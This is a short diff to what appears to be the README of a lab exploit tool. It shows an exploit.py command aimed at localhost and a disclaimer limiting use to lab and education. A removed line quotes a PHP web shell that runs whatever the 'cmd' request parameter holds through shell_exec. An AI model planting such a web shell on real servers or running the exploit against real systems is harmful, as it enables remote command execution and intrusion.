@@ -55,4 +55,4 @@ python3 exploit.py --url http://localhost:9999 --file payload.php
 
 ## Disclaimer
 For lab and educational use only.
-Only works with "<?php echo shell_exec($_GET['cmd']); ?>" payload 
+Only works with payload.php provided
